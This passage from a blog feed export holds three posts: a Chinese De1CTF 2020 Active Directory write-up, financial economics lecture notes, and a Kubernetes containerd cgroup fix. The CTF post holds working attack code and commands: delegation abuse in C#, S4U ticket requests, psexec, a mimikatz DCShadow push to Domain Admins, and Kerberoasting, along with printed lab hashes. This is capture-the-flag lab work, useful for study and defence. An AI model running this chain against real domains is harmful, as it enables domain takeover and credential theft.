class="comment">//通过ldap找计算机</span></span><br><span class="line">            search.Filter = <span class="string">&quot;(CN=&quot;</span> + victimcomputer + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">            <span class="built_in">string</span>[] requiredProperties = <span class="keyword">new</span> <span class="built_in">string</span>[] &#123; <span class="string">&quot;samaccountname&quot;</span> &#125;;</span><br><span class="line">            <span class="keyword">foreach</span> (String property <span class="keyword">in</span> requiredProperties)</span><br><span class="line">                search.PropertiesToLoad.Add(property);</span><br><span class="line">            System.DirectoryServices.SearchResult result = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                result = search.FindOne();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (System.Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(ex.Message + <span class="string">&quot;Exiting...&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (result != <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                System.DirectoryServices.DirectoryEntry entryToUpdate = result.GetDirectoryEntry();</span><br><span class="line">                String sec_desc = <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&quot;</span> + sid.Value + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">                System.Security.AccessControl.RawSecurityDescriptor sd = <span class="keyword">new</span> RawSecurityDescriptor(sec_desc);</span><br><span class="line">                <span class="built_in">byte</span>[] riptor_buffer = <span class="keyword">new</span> <span class="built_in">byte</span>[sd.BinaryLength];</span><br><span class="line">                sd.GetBinaryForm(riptor_buffer, <span class="number">0</span>);</span><br><span class="line">                <span class="comment">// 添加evilpc的sid到msds-allowedtoactonbehalfofotheridentity中</span></span><br><span class="line">                entryToUpdate.Properties[<span class="string">&quot;msds-allowedtoactonbehalfofotheridentity&quot;</span>].Value = riptor_buffer;</span><br><span class="line">                <span class="keyword">try</span></span><br><span class="line">                &#123;</span><br><span class="line">                    entryToUpdate.CommitChanges();<span class="comment">//提交更改</span></span><br><span class="line">                    Console.WriteLine(<span class="string">&quot;[+] Exploit successfully!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (System.Exception ex)</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(ex.Message);</span><br><span class="line">                    Console.WriteLine(<span class="string">&quot;[!] \nFailed...&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>因为环境很混乱几个队伍都在相互覆盖msds-allowedtoactonbehalfofotheridentity，所以先后添加了多个spn。。lisan3$ lisan4$<br>
<img src="1588576411595-d794a138-0eb8-4738-b4c5-ea04f61683b3.png#align=left&amp;display=inline&amp;height=243&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=362&amp;originWidth=1112&amp;size=65288&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
加上委派之后然后就是s4u提权了。这里踩了大坑，下面来说一下。我先用的kekeo。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgt::ask /user:lisan3$ /domain:De1CTF2020.lab /ntlm:30a7b270355d67451970d37ff1c9b666</span><br><span class="line">tgs::s4u /tgt:TGT_lisan3$@DE1CTF2020.LAB_krbtgt~De1CTF2020.lab@DE1CTF2020.LAB.kirbi /user:Administrator@De1CTF2020.lab /service:cifs/DM.De1CTF2020.lab</span><br></pre></td></tr></table></figure>
<p>S4U2self成功S4U2Proxy失败（<strong>当时反复确认过委派加上了的</strong>）<br>
<img src="1588578737623-9634b019-dbd5-4878-b9b2-c970e69673fb.png#align=left&amp;display=inline&amp;height=285&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=776&amp;originWidth=2032&amp;size=191776&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
<img src="1588578449118-60bc0cf5-845d-4a75-9838-3537490e2e89.png#align=left&amp;display=inline&amp;height=233&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=978&amp;originWidth=3130&amp;size=307346&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<p>换个工具rubues<br>
<img src="1588578877865-fa62ab88-598a-448a-9f29-a5e09ad0154b.png#align=left&amp;display=inline&amp;height=657&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1314&amp;originWidth=1520&amp;size=477950&amp;status=done&amp;style=none&amp;width=760" alt="image.png"><br>
但是dir始终不成功（后来问了一个师傅答复是：访问自己本身默认都是用当前用户身份去认证，不走网络认证，必须得主动调用网络认证才行）。<br>
<img src="1588578947263-dd9595db-1ef7-4933-956f-802b8d5973f2.png#align=left&amp;display=inline&amp;height=447&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=894&amp;originWidth=2030&amp;size=165161&amp;status=done&amp;style=none&amp;width=1015" alt="image.png"><br>
走到这里天色已晚有点肝不动了，就没继续了。第二天比赛结束出题师傅给我说用impakect就可以s4u而且能成。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains getST.py -hashes 30a7b270355d67451970d37ff1c9b666:30a7b270355d67451970d37ff1c9b666 -spn cifs/dm.De1CTF2020.lab De1CTF2020/lisan4$</span><br><span class="line">export KRB5CCNAME=/root/impacket-master/examples/lisan4$.ccache</span><br><span class="line">proxychains getST.py -hashes 30a7b270355d67451970d37ff1c9b666:30a7b270355d67451970d37ff1c9b666 -k -impersonate Administrator -spn cifs/dm.De1CTF2020.lab De1CTF2020/lisan4$</span><br><span class="line">export KRB5CCNAME=/root/impacket-master/examples/Administrator.ccache</span><br><span class="line">proxychains psexec.py -k -no-pass dm.De1CTF2020.lab</span><br></pre></td></tr></table></figure>
<p><strong>这里一定注意要用fqdn（dm.De1CTF2020.lab）来请求，不要用ip。</strong><br>
<strong>这里一定注意要用fqdn（dm.De1CTF2020.lab）来请求，不要用ip。</strong><br>
<strong>这里一定注意要用fqdn（dm.De1CTF2020.lab）来请求，不要用ip。</strong><br>
<strong><img src="1588579527302-5542f401-8459-4357-9d30-f4d0bbb75834.png#align=left&amp;display=inline&amp;height=647&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1294&amp;originWidth=2110&amp;size=852755&amp;status=done&amp;style=none&amp;width=1055" alt="image.png"></strong><br>
有system权限后就是Dcshadow的操作了</p>
<p>system权限下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell mimikatz.exe &quot;!+&quot; &quot;!processtoken&quot; &quot;lsadump::dcshadow /object:de1ta /attribute:primaryGroupID /value:512&quot;</span><br></pre></td></tr></table></figure>
<p>我一直以为这种非交互式的mimkatz运行完会被beacon自动关闭掉，实际测下来并不会。<br>
<img src="1588580027676-64acd1f2-4138-4a48-8328-e8c898022ff7.png#align=left&amp;display=inline&amp;height=721&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1442&amp;originWidth=2398&amp;size=323731&amp;status=done&amp;style=none&amp;width=1199" alt="image.png"><br>
De1ta权限下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell mimikatz.exe &quot;lsadump::dcshadow /push&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
<p><img src="1588580226016-f9634854-eaa3-4542-b4aa-5b6a59536ee9.png#align=left&amp;display=inline&amp;height=702&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1404&amp;originWidth=2018&amp;size=262325&amp;status=done&amp;style=none&amp;width=1009" alt="image.png"><br>
执行完后system那边会有反应<br>
<img src="1588580304255-65913d34-697b-402d-ac44-1a37b924c90c.png#align=left&amp;display=inline&amp;height=387&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=774&amp;originWidth=1562&amp;size=123041&amp;status=done&amp;style=none&amp;width=781" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure>
<p>会发现加上了<br>
<img src="1588580360804-da863178-d3eb-4ec1-aeb2-cc6c9c9042b9.png#align=left&amp;display=inline&amp;height=279&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=536&amp;originWidth=1432&amp;size=73835&amp;status=done&amp;style=none&amp;width=746" alt="image.png"><br>
照理可以直接dir了但是最后还是有一个莫名其妙的坑（忽视图中把路径写错了，不过不影响这里的意思就是没权限，路径不存在是另外一个报错）<br>
<img src="1588580430211-30595b4a-cadb-4f8e-87b1-2a0d2913d5a9.png#align=left&amp;display=inline&amp;height=297&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=594&amp;originWidth=1720&amp;size=125984&amp;status=done&amp;style=none&amp;width=860" alt="image.png"><br>
用rubues重新来一次tgt就好了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell Rubeus.exe asktgt /user:de1ta /rc4:B03094996601324646AC223BF30D0D07 /domain:de1ctf2020.lab /ptt</span><br><span class="line">shell type \\dc\c$\users\Administrator\Desktop\flag.txt</span><br></pre></td></tr></table></figure>
<p><img src="1588580555529-42793246-2e0e-45ea-a113-9cebe5dc9d0f.png#align=left&amp;display=inline&amp;height=117&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=214&amp;originWidth=1364&amp;size=44777&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<h2 id="来说说预期解拿到De1ta账号密码">来说说预期解拿到De1ta账号密码</h2>
<p><img src="1588585694577-60526aee-a9a7-4263-ba3d-8085030371f6.png#align=left&amp;display=inline&amp;height=352&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=704&amp;originWidth=1810&amp;size=134342&amp;status=done&amp;style=none&amp;width=905" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell setspn -s http/DM.De1CTF2020.lab De1CTF2020\De1ta</span><br></pre></td></tr></table></figure>
<p><img src="1588585758205-e69fc027-0b02-4e6f-b516-8785fa075439.png#align=left&amp;display=inline&amp;height=172&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=344&amp;originWidth=1426&amp;size=63731&amp;status=done&amp;style=none&amp;width=713" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell cscript GetUserSPNs.vbs</span><br></pre></td></tr></table></figure>
<p><img src="1588585820496-1b01ef87-4f61-424c-a363-3a1e47de1be5.png#align=left&amp;display=inline&amp;height=310&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=510&amp;originWidth=1226&amp;size=83062&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell-import /Users/cengsiqi/Desktop/pentest/Empire/data/module_source/credentials/Invoke-Kerberoast.ps1</span><br><span class="line">powershell Invoke-Kerberoast</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TicketByteHexStream  : </span><br><span class="line">Hash                 : $krb5tgs$http/DM.De1CTF2020.lab:0B5E0028717C31BF16F95DDF</span><br><span class="line">                       CA441A51$A71E43FD37E2E10E3029FE2767B0266CCABE13F68B27A46</span><br><span class="line">                       955A440DA3F3B4AF1D4C7A8C357B69655364C27DA73C80FBE9075A94</span><br><span class="line">                       615EB720E7A3E1E8610A1C18962338E87479D0A17D902B904B4DE4B5</span><br><span class="line">                       AD3BAE015D3709899570BD6D25392C9E98345535523CCBE65125B0E7</span><br><span class="line">                       1F2482040F2347DD13B7062B8A9E6DAA5C79F2843A2F030BBA0DCA91</span><br><span class="line">                       8FFEEE32D61BCAF4453315AAED98A427CF843C71EDB3EFBD2F47EF83</span><br><span class="line">                       9229E51A6A10A9D180B6EAF698B9C5D446F61BCA21E59413EC380A3F</span><br><span class="line">                       426F941EA42704B7262812E44FA1F04F05DAFF0E06B5690538D3BB8B</span><br><span class="line">                       10263FE97E05D6FE9F9E5BF1EFFF6A0344FA8F8B20CC0AA39BF95538</span><br><span class="line">                       4C3B543BF9B9A4E23C8F071D24E846F284A6FE62278E76ED47897FB2</span><br><span class="line">                       3264CC57A7EDE8C613EAD87914C511F2554AAEA6F663E66B8BA0760C</span><br><span class="line">                       296F82253303A5FF2DF5F8343AD2097F57B376BF83C302D806D620B9</span><br><span class="line">                       8ED2D3C53DF65AE37A7D6356EFC1A9123CCF56549A5288C132E3F5D0</span><br><span class="line">                       5A066CE50FFCB654BF79FD5F673175F9AD98C1140E8B50D0F574080A</span><br><span class="line">                       48EADBFBB00668B96A79F95E429CC42B4BD3CA2C9A106CD6D39312D9</span><br><span class="line">                       BD13B4452861E47DD71F36D3DAD4A570480D56BDEF1F278518219FA2</span><br><span class="line">                       5D076758B994C5F4EC8CF49C85DA1CFFAC91DF63AB5D71EF5135CD36</span><br><span class="line">                       D54FCB9C2A9EF61D67A3BC01EF668F255A66487F3493BE0F8352EAFF</span><br><span class="line">                       A009D561BE459F1130C6A3AF81060FD82232B3E430A196C5580FBDBB</span><br><span class="line">                       3EEAC6AA6FD2774063CB16C1CB161B20CD6ED3BF414349DECCCF8753</span><br><span class="line">                       9CE1EEBC28DD27DCE32752640F22817286211841DE22191300D75970</span><br><span class="line">                       D721021FA1211FA368A14EACEBABA5B42B1F3B087CE04782A695F046</span><br><span class="line">                       1CCCDC1445DE56D31582825E2824E47499C91A396D867A4284C4DD40</span><br><span class="line">                       AD1E1AF7A2073729FCB66A52C076A7F3515C93F54189CBDAAF408838</span><br><span class="line">                       736CA682CFF82CBA4DBFF757CD297CC16FF0A8F6F7C9F206ACB5BB87</span><br><span class="line">                       61C54AD1635572C16E6FC01B40E6F84F71153514EA21A87B28358A38</span><br><span class="line">                       4B3ECA5206F35EE3732DADE97726E07E8FEBE3D7EE3A77A2A4EEE1BE</span><br><span class="line">                       59F4EC5336E4F65D2A4F111C79A73D24F9BDFCCBEAEAC5768538EFAD</span><br><span class="line">                       00A191BB7941DF4A441BB83D061D42CB59D03A61921117DB835AA1D0</span><br><span class="line">                       DEB00AD6BC4A694CC39A465CF23447D7CDB1F19EBFCB92C555E75CE6</span><br><span class="line">                       7999B76A4FE22D1D34AF706A1505DC027D8BDC8A0055095605255BB8</span><br><span class="line">                       F437551248B77A559463C39934A6A95F183DD1FF5C4152949C0B6F69</span><br><span class="line">                       6C4B6A649A4B207CE4202B8884F54C1BC9ECA86F966EF2B86F3A89D3</span><br><span class="line">                       1E07C880C5E5DBCD35338FB485A46E74779D45BF38E2398A16377C15</span><br><span class="line">                       43E32DACFF71713DBF7288640AA751FC5A51B8DF873BBEB1F946331C</span><br><span class="line">                       CF59E6FC4209322D9BCAB8C51F5B408545BA9C4DA11755B4477DF968</span><br><span class="line">                       90F72E86D900D78BE6006BD14E1380725D1D8</span><br><span class="line">SamAccountName       : De1ta</span><br><span class="line">DistinguishedName    : CN=De1ta,CN=Users,DC=De1CTF2020,DC=lab</span><br><span class="line">ServicePrincipalName : http/DM.De1CTF2020.lab</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 13100 -a 0 kerberos.txt cracks.txt</span><br></pre></td></tr></table></figure>
<p>ps：用ps也可以GetSPNUser</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell-import /Users/cengsiqi/Desktop/pentest/wintool/kerberoast/GetUserSPNs.ps1</span><br><span class="line">powershell GetUserSPNs</span><br></pre></td></tr></table></figure>
<p><img src="1588586928131-13925d80-d0b6-473b-9610-c1a4dc4fa2e2.png#align=left&amp;display=inline&amp;height=607&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1214&amp;originWidth=3316&amp;size=393681&amp;status=done&amp;style=none&amp;width=1658" alt="image.png"></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Financial Economics Lecture1 Foundations, Approaches, and Key Concepts in Asset Pricing</title>
    <url>/2024/09/14/Financial-Economics-Lecture1-Foundations-Approaches-and-Key-Concepts-in-Asset-Pricing/</url>
    <content><![CDATA[<!-- more -->
<h2 id="I-Introduction-to-Financial-Economics">I. Introduction to Financial Economics</h2>
<h3 id="A-Definition-and-Scope">A. Definition and Scope</h3>
<ul>
<li>Financial Economics: The branch of economics focuses on assigning financial assets efficiently.</li>
<li>Core task: Understanding and determining the pricing of financial assets.</li>
</ul>
<h3 id="B-Key-Concepts">B. Key Concepts</h3>
<ol>
<li>
<p>Assets: Claims on future economic benefits.</p>
</li>
<li>
<p>Two critical dimensions in financial behavior:</p>
<ol>
<li>Intertemporal nature of decisions</li>
<li>**Uncertainty (risk) **associated with future outcomes</li>
</ol>
</li>
</ol>
<h2 id="II-Overview-of-Financial-Markets">II. Overview of Financial Markets</h2>
<h3 id="A-Basic-Structure">A. Basic Structure</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Funds Suppliers (Asset Buyers) → Investment → Funds Demanders (Asset Sellers)  </span><br><span class="line">                                ← Return ←  </span><br></pre></td></tr></table></figure>
<h3 id="B-Key-Focus">B. Key Focus</h3>
<ul>
<li>Central question: Determining asset prices</li>
<li>Pricing mechanism: Driven by supply and demand, which are derived from human behavior</li>
<li>Challenges: Human behavior is <strong>dynamic</strong> and <strong>uncertain</strong></li>
</ul>
<h3 id="C-Corporate-Finance">C. Corporate Finance</h3>
<ul>
<li>Special case: When asset sellers are corporations</li>
</ul>
<h2 id="III-Approaches-in-Financial-Economics">III. Approaches in Financial Economics</h2>
<h3 id="A-Equilibrium-Pricing">A. Equilibrium Pricing</h3>
<ul>
<li>Method: Build a model incorporating human preferences and constraints to deduce behavior and determine supply and demand.</li>
<li>Advantage: Can determine asset prices from fundamental principles.</li>
<li>Disadvantage: Relies on assumptions that may be inaccurate or oversimplified.</li>
</ul>
<h3 id="B-No-Arbitrage-Pricing">B. No-Arbitrage Pricing</h3>
<ul>
<li>Method: Deduce asset prices based on known prices of other assets.</li>
</ul>
<h3 id="C-Financial-Frictions-Analysis">C. Financial Frictions Analysis</h3>
<ul>
<li>Focus areas: Information asymmetry, period mismatch</li>
</ul>
<h3 id="D-Behavioral-Finance">D. Behavioral Finance</h3>
<ul>
<li>Approach: Incorporates “irrational” factors to better understand the behavior of market participants.</li>
</ul>
<h2 id="IV-Market-Efficiency-and-Behavioral-Finance">IV. Market Efficiency and Behavioral Finance</h2>
<ul>
<li>Question of market efficiency remains central to financial economics.</li>
<li>Behavioral finance helps explain deviations from traditional rational models.</li>
</ul>
<h2 id="V-Assets-and-Rate-of-Return">V. Assets and Rate of Return</h2>
<h3 id="A-Basic-Model-Single-Period-Binary-Tree">A. Basic Model: Single-Period Binary Tree</h3>
<ul>
<li>
<p>Current price: P</p>
</li>
<li>
<p>Future payoffs:</p>
<ul>
<li>Xu (probability q)</li>
<li>Xd (probability 1-q)</li>
</ul>
</li>
</ul>
<h3 id="B-Key-Questions">B. Key Questions</h3>
<ol>
<li>
<p>Given Xu and Xd, how to determine P?</p>
</li>
<li>
<p>What determines Xu and Xd? (Beyond the scope of financial economics)</p>
<ol>
<li>Industry factors</li>
<li>Business strategies</li>
<li>Competitive landscape</li>
<li>Management aspirations</li>
<li>Macroeconomic conditions</li>
<li>Geopolitical factors</li>
</ol>
</li>
</ol>
<h3 id="C-Return-Calculations">C. Return Calculations</h3>
<ul>
<li>Upside return: ru = (Xu/P) - 1</li>
<li>Downside return: rd = (Xd/P) - 1</li>
<li>Expected return: E® = q*ru + (1-q)*rd = E(x)/P - 1</li>
</ul>
<h3 id="D-Price-Return-Relationship">D. Price-Return Relationship</h3>
<ul>
<li>Inverse relationship between price (P) and expected return E®</li>
<li>Higher asset price → Lower expected return</li>
<li>Lower asset price → Higher expected return</li>
</ul>
<h3 id="E-Risk-Return-Trade-off">E. Risk-Return Trade-off</h3>
<ul>
<li>“Good” assets typically have higher prices but lower expected returns</li>
<li>“Bad” (riskier) assets typically have lower prices but higher expected returns</li>
<li>Market equilibrium tends to balance risk and return across assets</li>
</ul>
<h2 id="VI-Equilibrium-Pricing-Absolute-Pricing">VI. Equilibrium Pricing (Absolute Pricing)</h2>
<h3 id="A-Concept">A. Concept</h3>
<ul>
<li>Price is determined by the interaction of supply, demand, and behavior (under uncertainty/risk)</li>
<li>Aims to price assets from fundamental principles</li>
</ul>
<h3 id="B-Expected-Utility-Theory">B. Expected Utility Theory</h3>
<ul>
<li>
<p>Addresses limitations of simple expected value calculations</p>
</li>
<li>
<p>Example: St. Petersburg paradox (where E = ∞)</p>
<ul>
<li>Demonstrates why expected value alone is insufficient for decision-making</li>
</ul>
</li>
</ul>
<h3 id="C-Risk-and-Asset-Pricing-An-Example">C. Risk and Asset Pricing: An Example</h3>
<ol>
<li>
<p>Steel Company:</p>
<ol>
<li>Current price: Ps</li>
<li>Future dividends: 50% chance of 25,15</li>
</ol>
</li>
<li>
<p>Pharmaceutical Company:</p>
<ol>
<li>Current price: Pp</li>
<li>Future dividends: 50% chance of 40,0</li>
</ol>
</li>
</ol>
<p>Despite pharmaceutical companies having higher variance (risk), Pp should typically be higher than Ps. This counterintuitive result stems from the potential for higher returns, not just the risk involved.</p>
<h3 id="D-Performance-Evaluation-Beyond-Simple-Metrics">D. Performance Evaluation: Beyond Simple Metrics</h3>
<p>Consider two portfolio managers:</p>
<ul>
<li>
<p>Manager A: Average return rA = 10%, standard deviation σA</p>
</li>
<li>
<p>Manager B: Average return rB = 8%, standard deviation σB</p>
</li>
<li>
<p>If σA &lt; σB, can we conclude A is better than B?</p>
<ul>
<li>Not necessarily. Must consider risk-adjusted returns and investor preferences.</li>
</ul>
</li>
</ul>
<h2 id="VII-No-Arbitrage-Pricing-Relative-Pricing">VII. No-Arbitrage Pricing (Relative Pricing)</h2>
<h3 id="A-Concept-2">A. Concept</h3>
<ul>
<li>Based on the Law of One Price (LOOP)</li>
<li>Riskless profit opportunities violate LOOP</li>
</ul>
<h3 id="B-Examples">B. Examples</h3>
<ol>
<li>
<p>Fast Food Combo:</p>
<ol>
<li>If Hamburg = 1 and Coke=1, then (Hamburg, Coke) combo should = $2</li>
<li>Any deviation creates arbitrage opportunity</li>
</ol>
</li>
<li>
<p>Investment Box:</p>
<ol>
<li>
<p>Box transforms 1 into 1.02 (2% return)</p>
</li>
<li>
<p>Bank deposit rate = 3%</p>
</li>
<li>
<p>Box value?</p>
<ul>
<li>Not zero, despite lower return than bank</li>
<li>Option value exists if interest rates fall below 2% in future</li>
</ul>
</li>
</ol>
</li>
</ol>
<h3 id="C-Replication-and-Hedging">C. Replication and Hedging</h3>
<ul>
<li>Core of no-arbitrage pricing: Replicating cash flows</li>
<li>Enables hedging strategies</li>
<li>Fundamental to modern financial innovations</li>
</ul>
<h2 id="VIII-Financial-Frictions">VIII. Financial Frictions</h2>
<h3 id="A-Maturity-Mismatch">A. Maturity Mismatch</h3>
<ul>
<li>Lenders prefer liquidity (short-term)</li>
<li>Borrowers need stability (long-term)</li>
<li>Example: Construction projects require stable, long-term funding</li>
</ul>
<h3 id="B-Role-of-Financial-Intermediaries">B. Role of Financial Intermediaries</h3>
<ul>
<li>Banks transform short-term deposits into long-term loans</li>
<li>Crucial for economic stability and growth</li>
</ul>
<h2 id="IX-Market-Efficiency-and-Behavioral-Finance">IX. Market Efficiency and Behavioral Finance</h2>
<h3 id="A-Efficient-Market-Hypothesis-EMH">A. Efficient Market Hypothesis (EMH)</h3>
<ul>
<li>Fama’s theory: Markets rapidly incorporate all available information</li>
<li>Implies no persistent arbitrage opportunities</li>
</ul>
<h3 id="B-Challenges-to-EMH">B. Challenges to EMH</h3>
<ul>
<li>
<p>Shiller’s counterarguments</p>
</li>
<li>
<p>Behavioral Finance insights:</p>
<ul>
<li>Irrationality: e.g., overconfidence bias</li>
<li>Limited arbitrage: Practical limits to exploiting mispricings</li>
</ul>
</li>
</ul>
<h3 id="C-Martingale-Concept">C. Martingale Concept</h3>
<ul>
<li>Mathematical foundation for fair games and efficient markets</li>
</ul>
<h2 id="Key-Takeaways-from-Lecture-1">Key Takeaways from Lecture 1</h2>
<ol>
<li>Financial Economics focuses on the efficient allocation of financial assets and understanding asset pricing.</li>
<li>The field employs various approaches: equilibrium pricing, no-arbitrage pricing, and consideration of financial frictions.</li>
<li>Understanding risk, return, and their relationship is crucial in asset valuation.</li>
<li>Market efficiency and behavioral factors play significant roles in financial markets.</li>
<li>Both absolute (equilibrium) and relative (no-arbitrage) pricing methods are essential tools in financial economics.</li>
<li>Financial frictions, such as maturity mismatches, highlight the importance of financial intermediaries.</li>
</ol>
]]></content>
      <tags>
        <tag>economics</tag>
      </tags>
  </entry>
  <entry>
    <title>Fix CrashLoopBackOff when using kubeadm to init cluster</title>
    <url>/2025/01/12/Fix-CrashLoopBackOff-when-using-kubeadm-to-init-cluster/</url>
    <content><![CDATA[<!-- more -->
<h2 id="问题的解决">问题的解决</h2>
<p>这个问题，问AI一直没有解决，简中互联也没搜到。最后再gitlab issue里面找到答案。因此快速记一下修复原理。</p>
<p>解决问题的issue在</p>
<p><a href="https://github.com/kubernetes/kubeadm/issues/2833">https://github.com/kubernetes/kubeadm/issues/2833</a></p>
<p><a href="https://github.com/etcd-io/etcd/issues/13670">https://github.com/etcd-io/etcd/issues/13670</a></p>
<p>问题的特征是用kubeadm init启动，像issue里面会遇到CrashLoopBackOff</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@student-VMware-Virtual-Platform:/home/student/Desktop# kubectl get pods -n kube-system</span><br><span class="line">NAME                                                      READY   STATUS             RESTARTS        AGE</span><br><span class="line">coredns-668d6bf9bc-mc5mn                                  0/1     Pending            0               119s</span><br><span class="line">coredns-668d6bf9bc-sd84z                                  0/1     Pending            0               119s</span><br><span class="line">etcd-student-vmware-virtual-platform                      1/1     Running            2 (2m53s ago)   2m57s</span><br><span class="line">kube-apiserver-student-vmware-virtual-platform            1/1     Running            2 (2m23s ago)   2m57s</span><br><span class="line">kube-controller-manager-student-vmware-virtual-platform   1/1     Running            4 (2m53s ago)   2m57s</span><br><span class="line">kube-proxy-7k6hq                                          1/1     Running            2 (41s ago)     2m</span><br><span class="line">kube-scheduler-student-vmware-virtual-platform            0/1     CrashLoopBackOff   4 (22s ago)     2m57s</span><br><span class="line">root@student-VMware-Virtual-Platform:/home/student/Desktop# </span><br></pre></td></tr></table></figure>
<p>然后慢慢的整个集群在挂掉，使用不了kubectl。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@student-VMware-Virtual-Platform:/home/student/Desktop/lk8s# kubectl get pods -n kube-system  </span><br><span class="line">The connection to the server 192.168.220.128:6443 was refused - did you specify the right host or port?</span><br></pre></td></tr></table></figure>
<p>看apiserver的容器日志发现它就是收到了信号被关了，也没有error错误。</p>
<p>解决方法是在/etc/containerd/config.toml</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/containerd/</span><br><span class="line">vim /etc/containerd/config.toml</span><br></pre></td></tr></table></figure>
<p>添加配置</p>
<figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version</span> = <span class="number">2</span></span><br><span class="line"><span class="section">[plugins]</span></span><br><span class="line">  <span class="section">[plugins.&quot;io.containerd.grpc.v1.cri&quot;]</span></span><br><span class="line">   <span class="section">[plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd]</span></span><br><span class="line">      <span class="section">[plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.runtimes]</span></span><br><span class="line">        <span class="section">[plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.runtimes.runc]</span></span><br><span class="line">          <span class="attr">runtime_type</span> = <span class="string">&quot;io.containerd.runc.v2&quot;</span></span><br><span class="line">          <span class="section">[plugins.&quot;io.containerd.grpc.v1.cri&quot;.containerd.runtimes.runc.options]</span></span><br><span class="line">            <span class="attr">SystemdCgroup</span> = <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h2 id="产生问题的原因">产生问题的原因</h2>
<p>根据issue的里面指导可以看到k8s文档，在linux下又两个cgroup driver，一个是cgroupfs，一个是systemd。</p>
<p>Kubelet和容器运行时必须要使用一样的cgroup driver才可以。</p>
<blockquote>
<p>It’s critical that the kubelet and the container runtime use the same cgroup driver and are configured the same.</p>
</blockquote>
<p>根据文档所说kubelet默认情况下用的是cgroupfs</p>
<p><img src="image1.png" alt=""></p>
<p>但是我这里使用kubeadm v1.32，默认是用的systemd</p>
<p><img src="image2.png" alt=""></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/lib/kubelet/config.yaml | grep cgroupDriver</span><br></pre></td></tr></table></figure>
<p><img src="image3.png" alt=""></p>
<p>再看containerd配置，看到默认是cgroupfs而不是system</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">containerd config default &gt; /tmp/1.txt</span><br></pre></td></tr></table></figure>
<blockquote>
<p>systemd_cgroup = false</p>
<p>[plugins.“io.containerd.grpc.v1.cri”.containerd.runtimes.runc.options]<br>
BinaryName = “”<br>
CriuImagePath = “”<br>
CriuPath = “”<br>
CriuWorkPath = “”<br>
IoGid = 0<br>
IoUid = 0<br>
NoNewKeyring = false<br>
NoPivotRoot = false<br>
Root = “”<br>
ShimCgroup = “”<br>
SystemdCgroup = false</p>
</blockquote>
